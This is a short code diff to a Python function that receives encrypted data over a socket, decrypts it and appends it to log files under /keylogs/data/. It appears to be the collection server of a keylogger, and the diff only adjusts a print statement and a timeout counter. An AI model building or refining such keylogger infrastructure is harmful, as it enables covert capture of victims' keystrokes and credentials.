@@ -173,11 +173,11 @@ def receiver(port):
         with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
             if data:
-                print(dechiffrement(data))
                 f.write(dechiffrement(data))
                 print(f"\n{client_address} - ONLINE")
                 print("Update sur /keylogs/data/" + ficname)
-                buffer_time = 0;
+            if dechiffrement(data) != "" :
+                buffer_time = 0
             else:
                 buffer_time = buffer_time + 1
         if buffer_time == 20:
